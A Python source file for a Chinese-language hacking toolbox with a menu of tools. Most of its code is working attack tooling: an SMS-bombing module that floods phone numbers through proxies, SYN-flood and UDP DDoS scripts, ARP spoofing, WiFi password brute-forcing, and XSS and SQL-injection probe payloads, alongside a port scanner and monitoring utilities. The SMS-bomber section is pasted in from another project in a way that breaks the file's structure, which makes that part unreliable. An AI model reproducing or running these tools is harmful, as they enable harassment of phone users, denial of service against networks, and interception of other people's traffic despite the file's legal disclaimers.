import hashlib
import sys
import os
import time
import socket
import random
from datetime import datetime
import pywifi
import requests
import re
import psutil
from scapy.all import send, sniff, IP, TCP, UDP
import subprocess
import dns.resolver
import string
from cryptography.fernet import Fernet

# 最大密码尝试次数
MAX_ATTEMPTS = 3

# 显示版权信息
def show_legal_notice():
    print("BohanHou的工具箱")
    print("作者：BohanHou")
    print("版权所有：BohanHou")
    print("GitHub项目地址：https://github.com/YT-Houbohan/Bohan_Hou_Tools")
    print("联系方式：  QQ:3225215070"
          "\n            Email: hou.bohan@qq.com"
          "\n            Github: https://github.com/YT-Houbohan")
    print("\033[31m\n警告：此工具仅供授权的安全测试和学习使用。\033[0m\n \033[31m作者不承担因使用此工具造成的一切后果。\033[0m")
    print("\033[31m\n警告：未经授权使用此工具对目标系统进行攻击可能违反法律。\033[0m\n")
    print("\033[31m\n警告：使用此工具造成的任何法律纠纷，由使用者自行承担。\033[0m\n \033[31m作者不承担因使用此工具造成的一切法律责任。\033[0m")
    print("使用本工具即表示您同意遵守相关法律法规。")
    input("按Enter键继续...")

# 对密码进行哈希加密
def hash_password(password):
    hash_object = hashlib.sha256(password.encode())
    return hash_object.hexdigest()

# 禁用程序自身
def disable_self():
    with open(__file__, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    disabled_code = [
        "# DISABLED BY SECURITY SYSTEM\n",
        "print('程序已被禁用，\033[31m\n请勿使用此程序！\033[0m')\n",
        "import sys; sys.exit(1)\n"
    ]

    with open(__file__, 'w', encoding='utf-8') as f:
        f.writelines(disabled_code + lines)

# 验证密码
show_legal_notice()

def verify_password():
    hashed_password = hash_password("Bohan_Hou")
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        pw = input("请输入密码: ")
        input_hashed = hash_password(pw)
        if input_hashed == hashed_password:
            return True
        else:
            print("\033[31m\n密码不对,请重新输入(最多3次)\033[0m")
            attempts += 1
    if attempts >= MAX_ATTEMPTS:
        disable_self()
        print("\033[31m程序已被禁用！\033[31m\n请勿使用此程序！\033[0m")
        sys.exit(1)

# 显示进度条
def show_progress(percentage):
    bar_length = 20
    filled_length = int(bar_length * percentage / 100)
    bar = '=' * filled_length + ' ' * (bar_length - filled_length)
    print(f"[{bar}] {percentage}%")

import threading
from queue import Queue

# 手机号短信轰炸###########################################################################################################################
def Mobile_phone_number_SMS_bombing():
    from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import time
import click
import httpx
import os

if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_all = []
    proxy_file = ["http_proxy.txt", "socks5_proxy.txt", "socks4_proxy.txt"]
    for fn in proxy_file:
        f_obj = pathlib.Path(path, fn)
        if f_obj.exists():
            proxy_lst = pathlib.Path(path, fn).read_text(
                encoding="utf8").split("\n")
            if not proxy_lst:
                continue
            if fn == "http_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'http://' + proxy})
            elif fn == "socks5_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks5://' + proxy})
            elif fn == "socks4_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks4://' + proxy})
        else:
            f_obj.touch()
    logger.success(f"代理列表加载完成,代理数:{len(proxy_all)}")
    return proxy_all


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            raise ValueError


@click.command()
@click.option("--thread", "-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", multiple=True, type=str)
@click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    while not phone:
        phone = input("Phone: ")
    for i in phone:
        if not i.isdigit():
            logger.error("手机号必须为纯数字！")
            sys.exit(1)
    logger.info(
        f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
    try:
        _api = load_json()
        _api_get = load_getapi()
        _proxies = load_proxies()
        # fix: by Ethan
        if not _proxies:
            if enable_proxy:
                logger.error("无法读取任何代理....请取消-e")
                sys.exit(1)
            _proxies = [None]
    except ValueError:
        logger.error("读取接口出错!正在重新下载接口数据!....")
        update()
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=thread) as pool:
        for i in range(1, frequency + 1):
            logger.success(f"第{i}波轰炸开始！")
            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
            for proxy in _proxies:
                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                # 不可用的代理或API过多可能会影响轰炸效果
                for api in _api:
                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def asyncRun(phone):
    """以最快的方式请求接口(真异步百万并发)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def oneRun(phone):
    """单线程(测试使用)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    for api in apis:
        try:
            reqFunc(api, phone)
        except:
            pass


@click.command()
def update():
    """从 github 获取最新接口"""
    apiList = ['https://hk1.monika.love/OpenEthan/SMSBoom/master/','https://download.superlinkstudio.top/smsboom/']
    apiS = int(input("选择更新的apiS接口[0.自带  1.SuperLinkStudioCloud]:"))
    GETAPI_json_url = f"{apiList[apiS]}GETAPI.json"
    API_json_url = f"{apiList[apiS]}api.json"
    logger.info(f"正在从 {apiList[apiS]} 拉取最新接口!")
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            GETAPI_json = client.get(
                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")

    except Exception as why:
        logger.error(f"拉取更新失败:{why}请关闭所有代理软件多尝试几次!")
    else:
        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)
        logger.success(f"接口更新成功!")


@click.group()
def cli():
    pass


cli.add_command(run)
cli.add_command(update)
cli.add_command(asyncRun)
cli.add_command(oneRun)

if __name__ == "__main__":
    cli()

# SYN洪水攻击###########################################################################################################################
def syn_flood():
    # 生成随机的IP
    def randomIP():
        ip = ".".join(map(str, (random.randint(0, 255) for i in range(4))))
        return ip

    # 生成随机端口
    def randomPort():
        port = random.randint(1000, 10000)
        return port

    # syn-flood
    def synFlood(count, dstIP):
        total = 0
        print("Packets are sending ...")
        for i in range(count):
            # IPlayer
            srcIP = randomIP()  # 随机源ip地址
            dstIP = dstIP
            IPlayer = IP(src=srcIP, dst=dstIP)
            # TCPlayer
            srcPort = randomPort()
            TCPlayer = TCP(sport=srcPort, dport=randomPort(), flags="S")
            # 发送包
            packet = IPlayer / TCPlayer
            send(packet)
            total += 1
        print("Total packets sent: %i" % total)

    # 显示的信息
    def info():
        print("#" * 30)
        print("# Welcome to SYN Flood Tool  #")
        print("#" * 30)
        # 输入目标IP和端口
        dstIP = input("Target IP : ")
        return dstIP

    dstIP = info()
    count = int(input("Please input the number of packets："))
    synFlood(count, dstIP)

# 端口扫描器###########################################################################################################################
def validate_ip(target):
    try:
        socket.inet_aton(target)
        return True
    except socket.error:
        return False

def validate_ports(ports_input):
    try:
        ports = [int(port) for port in ports_input.split(',')]
        return ports
    except ValueError:
        return None

def port_scanner():
    while True:
        target = input("请输入目标 IP 地址: ")
        if validate_ip(target):
            break
        else:
            print("输入的 IP 地址格式无效，请重新输入。")

    while True:
        ports_input = input("请输入要扫描的端口，用逗号分隔 (例如: 80,443): ")
        ports = validate_ports(ports_input)
        if ports is not None:
            break
        else:
            print("输入的端口号无效，请输入有效的整数，用逗号分隔。")

    port_scan(target, ports)

def port_scan(target, ports):
    print(f"开始扫描 {target}...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"端口 {port} 开放")
            else:
                print(f"端口 {port} 关闭")
            sock.close()
        except socket.gaierror:
            print(f"无法解析主机名 {target}，请检查输入的 IP 地址。")
            break
        except socket.timeout:
            print(f"扫描端口 {port} 时超时，请检查网络连接或目标主机状态。")
        except socket.error as e:
            print(f"扫描端口 {port} 时出现网络错误: {e}")
        except Exception as e:
            print(f"扫描端口 {port} 时出现未知错误: {e}")
#爆破WiFi密码###################################################################################################################
def wifi_cracker():
    import pywifi
    from pywifi import const
    import time
    import sys

    def wifiConnect(wifiname, wifipassword):
        wifi = pywifi.PyWiFi()
        ifaces = wifi.interfaces()[0]
        # 断开连接
        ifaces.disconnect()
        time.sleep(0.5)
        if ifaces.status() == const.IFACE_DISCONNECTED:
            # 创建WiFi连接文件
            profile = pywifi.Profile()
            # WiFi名称
            profile.ssid = wifiname
            # WiFi密码
            profile.key = wifipassword
            # WiFi的加密算法
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 网卡的开放
            profile.auth = const.AUTH_ALG_OPEN
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP

            # 删除所有的WiFi文件
            ifaces.remove_all_network_profiles()
            # 设定新的连接文件
            tep_profile = ifaces.add_network_profile(profile)

            # 连接WiFi
            ifaces.connect(tep_profile)
            time.sleep(3)
            if ifaces.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False

    def read_password(password_file, wifi_name):
        '''读取密码本'''
        print('开始破解：')
        try:
            with open(password_file, 'r', encoding='utf-8') as file:
                while True:
                    wifipwd = file.readline().strip()  # 去除换行符
                    if not wifipwd:
                        break
                    result = wifiConnect(wifi_name, wifipwd)
                    if result:
                        print(f'密码正确：{wifipwd}')
                        return wifipwd
                    else:
                        print(f'密码错误：{wifipwd}')
            print("密码本遍历完毕，未找到正确密码")
        except FileNotFoundError:
            print(f"错误：找不到密码本文件 {password_file}")
        except Exception as e:
            print(f"发生未知错误：{e}")

    # 获取用户输入的密码本路径和WiFi名称
    password_file = input("请输入密码本路径: ")
    wifi_name = input("请输入WiFi名称: ")

    read_password(password_file, wifi_name)



# DDoS脚本###########################################################################################################################
def ddos_attack():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    os.system("clear")
    os.system("figlet Elsa-zlt DDos Attack")
    print()
    print("Author   : BohanHou")
    print("未经授权对目标进行 DDoS 攻击是违法且不道德的行为，可能会导致严重的法律后果。此代码仅用于学习和研究网络编程及安全防御相关知识，请勿用于非法活动。")
    print()

    ip = input("IP Target : ")

    while True:
        port = input("Port       : ")
        try:
            port = int(port)
            break
        except ValueError:
            print("输入的端口号无效，请输入一个整数。")

    while True:
        speed = input("攻击速度 (数据包/秒): ")
        try:
            packets_per_second = int(speed)
            if packets_per_second <= 0:
                print("速度必须大于0")
            else:
                break
        except ValueError:
            print("输入无效，请输入一个整数。")

    os.system("clear")
    os.system("figlet Elsa-zlt DDos Attack")
    print(f"目标: {ip}:{port}")
    print(f"攻击速度: {packets_per_second} 数据包/秒")
    print("准备中...")

    for i in range(0, 101, 25):
        show_progress(i)
        time.sleep(0.5)  # 加速准备进度显示

    # 计算每个线程的发送间隔 (毫秒)
    thread_count = 10
    interval = 1.0 / packets_per_second * thread_count

    packet_queue = Queue()
    # 预生成大量数据包
    for _ in range(10000):
        packet_queue.put(random._urandom(1490))

    def attack_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent_count = 0
        start_time = time.time()

        while not packet_queue.empty():
            try:
                packet = packet_queue.get()
                sock.sendto(packet, (ip, port))
                sent_count += 1

                # 速度控制
                elapsed = time.time() - start_time
                expected_elapsed = sent_count * interval
                if elapsed < expected_elapsed:
                    time.sleep(expected_elapsed - elapsed)

                # 每100个包显示一次进度
                if sent_count % 100 == 0:
                    current_speed = sent_count / (time.time() - start_time)
                    print(f"\r已发送: {sent_count} 数据包 | 当前速度: {current_speed:.1f} PPS", end="")

            except Exception as e:
                print(f"\n线程出错: {e}")
            finally:
                packet_queue.task_done()

    # 创建并启动多个攻击线程
    print("\n启动攻击线程...")
    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"线程 {i + 1}/{thread_count} 已启动")
        time.sleep(0.1)  # 线程启动间隔，避免系统过载

    # 等待所有线程完成
    print("\n攻击进行中，按 Ctrl+C 停止...")
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n用户中断，正在停止攻击...")

    print("\n攻击已停止")

# 简单的 XSS 检测###########################################################################################################################
def check_xss(url):
    xss_payload = '<script>alert("XSS")</script>'
    xss_url = f"{url}?param={xss_payload}"
    try:
        response = requests.get(xss_url)
        if xss_payload in response.text:
            print(f"[!] 可能存在 XSS 漏洞: {xss_url}")
        else:
            print("[✓] 未检测到 XSS 漏洞")
    except Exception as e:
        print(f"XSS 检测出错: {e}")

# 简单的 SQLi 检测
def check_sqli(url):
    sqli_payloads = ["' OR '1'='1", "' OR 1=1 --"]
    for payload in sqli_payloads:
        sqli_url = f"{url}?id={payload}"
        try:
            response = requests.get(sqli_url)
            if response.status_code == 200:
                print(f"[!] 可能存在 SQL 注入漏洞: {sqli_url}")
            else:
                print(f"[✓] {payload} 测试未发现 SQL 注入")
        except Exception as e:
            print(f"SQLi 检测出错: {e}")

# Web漏洞扫描器
def web_vulnerability_scanner():
    url = input("请输入要扫描的 URL: ")
    check_xss(url)
    check_sqli(url)

# 获取本机所有网络接口信息###########################################################################################################################
def get_local_network_info():
    interfaces = psutil.net_if_addrs()
    for interface, addrs in interfaces.items():
        print(f"接口名称: {interface}")
        for addr in addrs:
            if addr.family == socket.AF_INET:
                print(f"  IPv4 地址: {addr.address}")
                print(f"  子网掩码: {addr.netmask}")
            elif addr.family == socket.AF_INET6:
                print(f"  IPv6 地址: {addr.address}")
            elif addr.family == psutil.AF_LINK:
                print(f"  MAC 地址: {addr.address}")
        print()


# Traceroute 功能###########################################################################################################################
def traceroute():
    import subprocess
    import platform

    target = input("请输入要 Traceroute 的目标 IP 或域名: ")
    try:
        if platform.system().lower() == 'windows':
            result = subprocess.run(['tracert', target], capture_output=True, text=True)
        else:
            result = subprocess.run(['traceroute', target], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Traceroute 出错: {e}")

# DNS 查询###########################################################################################################################
def dns_lookup():
    domain = input("请输入要查询的域名: ")
    try:
        answers = dns.resolver.query(domain, 'A')
        for rdata in answers:
            print(f"{domain} 的 IP 地址是: {rdata.address}")
    except dns.resolver.NXDOMAIN:
        print(f"未找到 {domain} 的 DNS 记录。")
    except Exception as e:
        print(f"DNS 查询出错: {e}")

# 网络流量分析器###########################################################################################################################
def network_traffic_analyzer():
    print("网络流量分析器 (按Ctrl+C停止)")
    print("正在捕获网络流量...")

    def packet_callback(packet):
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            proto = packet[IP].proto

            protocol = ""
            if TCP in packet:
                protocol = f"TCP:{packet[TCP].dport}"
            elif UDP in packet:
                protocol = f"UDP:{packet[UDP].dport}"

            print(f"{src_ip} -> {dst_ip} | {protocol} | {len(packet)} bytes")

    try:
        sniff(prn=packet_callback, store=0)
    except KeyboardInterrupt:
        print("\n捕获已停止")


# ARP欺骗################################################################################################################
def arp_spoof():
    import os
    from scapy.all import ARP, Ether, getmacbyip, sendp, get_if_hwaddr, conf
    import platform
    import threading
    import time

    # 获取网络接口信息
    system = platform.system()
    if system == "Windows":
        os.system('ipconfig')
    elif system == "Linux" or system == "Darwin":  # Darwin是macOS的系统标识
        os.system('ip addr show')
    else:
        print("不支持的操作系统")
        return

    # 输入信息
    gateway_ip = input('请输入网关IP地址：')
    your_ip = input('请输入你的IP地址：')
    target_ip = input('请输入目标IP地址：')
    interface = input('请输入你的网络接口名称（例如 eth0 或 ens33）：')

    # 获取MAC地址
    try:
        print(f"正在获取 {target_ip} 的MAC地址...")
        target_mac = getmacbyip(target_ip)
        if not target_mac:
            print(f"[-] 无法获取 {target_ip} 的MAC地址")
            print("提示：确保目标设备在线且网络可达")
            return
        print(f"[+] 目标MAC地址: {target_mac}")
    except Exception as e:
        print(f"[-] 获取目标MAC地址时出错: {e}")
        return

    try:
        print(f"正在获取 {your_ip} 的MAC地址...")
        your_mac = get_if_hwaddr(interface)
        if not your_mac:
            print(f"[-] 无法获取 {your_ip} 的MAC地址")
            print("提示：确保输入的网络接口名称正确且接口在线")
            return
        print(f"[+] 本机MAC地址: {your_mac}")
    except Exception as e:
        print(f"[-] 获取本机MAC地址时出错: {e}")
        return

    # 确认信息
    print("\nARP欺骗配置信息:")
    print(f"网关IP: {gateway_ip}")
    print(f"本机IP: {your_ip} ({your_mac})")
    print(f"目标IP: {target_ip} ({target_mac})")
    print(f"网络接口: {interface}")
    print("=" * 50)

    # 构造ARP响应包
    eth = Ether(dst=target_mac)  # 单播到目标设备
    arp = ARP(
        op=2,  # ARP响应
        hwsrc=your_mac,  # 伪造的MAC地址（本机MAC）
        psrc=gateway_ip,  # 伪造的IP地址（网关IP）
        hwdst=target_mac,  # 目标MAC
        pdst=target_ip  # 目标IP
    )

    # 显示ARP包信息
    print("[+] ARP欺骗包配置:")
    arp.show()
    print("=" * 50)

    # 计数器和停止标志
    packet_count = 0
    stop_flag = threading.Event()

    # 发送线程函数
    def send_arp_packets():
        nonlocal packet_count
        print("[+] 开始发送ARP欺骗包 (按Ctrl+C停止)...")
        try:
            while not stop_flag.is_set():
                sendp(eth/arp, verbose=True, iface=interface)  # 发送时显示每个包的信息
                packet_count += 1
                if packet_count % 10 == 0:
                    print(f"\r[+] 已发送: {packet_count} 个ARP欺骗包", end="")
                time.sleep(2)  # 每2秒发送一次
        except Exception as e:
            print(f"\n[-] 发送过程中出错: {e}")
        finally:
            print(f"\n[+] ARP欺骗已停止，共发送 {packet_count} 个包")

    # 启动发送线程
    send_thread = threading.Thread(target=send_arp_packets)
    send_thread.daemon = True
    send_thread.start()

    # 等待用户中断
    try:
        while send_thread.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] 检测到用户中断...")
        stop_flag.set()
        send_thread.join(timeout=2.0)
        if send_thread.is_alive():
            print("[!] 发送线程未能及时停止")
        else:
            print("[+] 发送线程已成功停止")

    # 恢复ARP表（向目标发送正确的网关信息）
    print("[+] 正在恢复目标ARP表...")
    try:
        real_gateway_mac = getmacbyip(gateway_ip)
        if not real_gateway_mac:
            print(f"[-] 无法获取真实的网关MAC地址")
            return

        correct_arp = ARP(
            op=2,
            hwsrc=real_gateway_mac,  # 真实网关MAC
            psrc=gateway_ip,
            hwdst=target_mac,
            pdst=target_ip
        )
        sendp(correct_arp, count=5, verbose=True, iface=interface)  # 发送时显示每个包的信息
        print("[+] 目标ARP表已恢复")
    except Exception as e:
        print(f"[-] 恢复ARP表时出错: {e}")
        print("[!] 请手动恢复目标设备的ARP缓存")


# 密码强度检测器###########################################################################################################################
def password_strength_checker():
    def calculate_strength(password):
        length = len(password)
        has_upper = any(c in string.ascii_uppercase for c in password)
        has_lower = any(c in string.ascii_lowercase for c in password)
        has_digit = any(c in string.digits for c in password)
        has_special = any(c in string.punctuation for c in password)

        strength = 0
        if length >= 8: strength += 1
        if length >= 12: strength += 1
        if has_upper: strength += 1
        if has_lower: strength += 1
        if has_digit: strength += 1
        if has_special: strength += 1

        return strength

    password = input("输入要检测的密码: ")
    strength = calculate_strength(password)

    ratings = {
        0: "非常弱",
        1: "弱",
        2: "中等",
        3: "良好",
        4: "强",
        5: "非常强",
        6: "极强"
    }

    print(f"密码强度: {ratings.get(strength, '未知')} ({strength}/6)")

# 文件加密/解密工具###########################################################################################################################
def file_encryption_tool():
    def generate_key():
        return Fernet.generate_key().decode()

    def encrypt_file(key, filename):
        fernet = Fernet(key.encode())
        with open(filename, "rb") as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(filename + ".enc", "wb") as file:
            file.write(encrypted)

    def decrypt_file(key, filename):
        fernet = Fernet(key.encode())
        with open(filename, "rb") as file:
            encrypted = file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(filename.replace(".enc", ""), "wb") as file:
            file.write(decrypted)

    print("1. 加密文件")
    print("2. 解密文件")
    choice = input("选择操作: ")

    if choice == "1":
        filename = input("输入要加密的文件路径: ")
        key = generate_key()
        encrypt_file(key, filename)
        print(f"文件已加密! 密钥: {key}")
    elif choice == "2":
        filename = input("输入要解密的文件路径: ")
        key = input("输入密钥: ")
        decrypt_file(key, filename)
        print("文件已解密!")

# 系统资源监控器###########################################################################################################################
def system_monitor():
    print("系统资源监控器 (按Ctrl+C停止)")
    print("CPU | 内存 | 磁盘 | 网络")

    try:
        while True:
            cpu_percent = psutil.cpu_percent()
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            net = psutil.net_io_counters()

            print(f"{cpu_percent}% | {mem.percent}% | {disk.percent}% | "
                  f"↑{net.bytes_sent//1024}KB ↓{net.bytes_recv//1024}KB")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n监控已停止")

# 网站可用性监控###########################################################################################################################
def website_monitor():
    url = input("输入要监控的网站URL: ")
    interval = int(input("输入检查间隔(秒): "))

    print(f"开始监控 {url} (按Ctrl+C停止)")

    try:
        while True:
            try:
                start_time = time.time()
                response = requests.get(url, timeout=5)
                end_time = time.time()

                if response.status_code == 200:
                    print(f"[✓] 可用 | 响应时间: {(end_time - start_time)*1000:.2f}ms")
                else:
                    print(f"[!] 状态码: {response.status_code}")
            except Exception as e:
                print(f"[✗] 错误: {str(e)}")

            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n监控已停止")

# IP地理位置查询###########################################################################################################################
def ip_geolocation():
    ip = input("输入要查询的IP地址: ")
    url = f"http://ip-api.com/json/{ip}"

    try:
        response = requests.get(url)
        data = response.json()

        if data["status"] == "success":
            print(f"国家: {data['country']}")
            print(f"地区: {data['regionName']}")
            print(f"城市: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"经纬度: {data['lat']}, {data['lon']}")
        else:
            print("查询失败")
    except Exception as e:
        print(f"查询出错: {e}")

# 显示菜单
def show_menu():
    menu_options = {
        "000": ("退出", sys.exit),
        "1": ("DDoS攻击脚本", ddos_attack),
        "2": ("简单的 Web 漏洞扫描器", web_vulnerability_scanner),
        "3": ("端口扫描器", port_scanner),
        "4": ("手机号轰炸", Mobile_phone_number_SMS_bombing),
        "5": ("获取本机网络接口信息", get_local_network_info),
        "6": ("SYN洪水攻击脚本", syn_flood),
        "7": ("Traceroute 功能", traceroute),
        "8": ("DNS 查询", dns_lookup),
        "9": ("网络流量分析器", network_traffic_analyzer),
        "10": ("密码强度检测器", password_strength_checker),
        "11": ("文件加密/解密工具", file_encryption_tool),
        "12": ("系统资源监控器", system_monitor),
        "13": ("网站可用性监控", website_monitor),
        "14": ("IP地理位置查询", ip_geolocation),
        "15": ("ARP欺骗", arp_spoof),
        "16": ("wifi破解密码",wifi_cracker)
    }

    while True:
        print("\n" + "=" * 50)
        print("欢迎使用BohanHou的工具箱".center(50))
        print("=" * 50)

        for key, value in menu_options.items():
            print(f"  {key}. {value[0]}")

        choice = input("\n请输入要选择的功能编号: ")

        if choice in menu_options:
            menu_options[choice][1]()
            input("\n按Enter键返回主菜单...")
        else:
            print("无效的选择，请重新输入。")

# 主程序
print("欢迎使用BohanHou的工具箱,请输入密码:")
if verify_password():
    while True:
        try:
            show_menu()
        except KeyboardInterrupt:
            print("\n检测到Ctrl+C，正在退出程序...")
            sys.exit(0)
